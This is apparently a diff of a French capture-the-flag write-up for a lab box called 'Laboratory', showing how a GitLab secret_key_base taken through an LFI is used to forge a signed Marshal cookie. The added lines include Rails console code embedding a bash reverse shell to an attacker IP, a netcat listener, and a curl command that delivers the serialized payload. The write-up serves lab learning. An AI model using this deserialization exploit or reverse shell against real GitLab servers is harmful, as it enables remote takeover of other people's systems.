@@ -166,6 +166,8 @@ production:
 
 ```
 
+#### Creation du payload
+
 Pour générer notre payload il va falloir le créer à l'aide de la clef privée récupéré via la LFI.
 Pour cela il faut monter un gitlab de même version et y remplacer la clef générée par celle récupérée. 
 Le meilleur moyen de monter un Gitlab rapidement et avec la bonne version est via Docker. 
@@ -196,23 +198,29 @@ CONTAINER ID   IMAGE          COMMAND             CREATED         STATUS        
 root@8d3027edf640:/# 
 ```
 
-On remplace le secret dans le container Gitlab : 
+On remplace la `secret_key_base` de `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` dans le même fichier dans le container Gitlab.
+Pensez bien à restart les services gitlab et ouvrir un listener : `nc -lvnp 9999`
+
 ```bash
-{16:16}/netsec/box/Laboratory ➭ python3 -m http.server 8181
-Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
 
-root@8d3027edf640:/tmp# wget http://192.168.1.37/secrets.yml
-root@8d3027edf640:/tmp# mv secrets.yml /var/opt/gitlab/gitlab-rails/etc/secrets.yml 
+root@8d3027edf640:/# gitlab-ctl restart
+root@8d3027edf640:/# gitlab-rails console
 
-root@8d3027edf640:/tmp# md5sum /var/opt/gitlab/gitlab-rails/etc/secrets.yml
-6f85c9ff680877c06f63cc73fecc02a6  /var/opt/gitlab/gitlab-rails/etc/secrets.yml
-{16:19}/netsec/box/Laboratory ➭ md5sum secrets.yml          
-6f85c9ff680877c06f63cc73fecc02a6  secrets.yml
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/192.168.1.37/9999 0>&1'` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
 ```
 
-#### Creation du payload
+Une fois le cookie crée : 
 
-
+```bash
+curl -k -x http://192.168.1.39:3128 'http://gitlab.laboratory.ctf/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06"
+```
 
 
 
@@ -240,6 +248,14 @@ moving issue from soOIauiULL to 3VzymEcL6y - 200
 Grabbing file secrets.yml
 deploying payload - 500
 delete user ILMgLy6G55 - 200
+```
+
+### Devenir administrateur du gitlab
+
+Maintenant que nous avons accès à la console gitlab nous pouvons donner les droits d'administrateur à notre user gitlab [gitlab console CheatSheet](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html)
+
+```bash
+
 ```
 
 ## Container Lateral Escapce
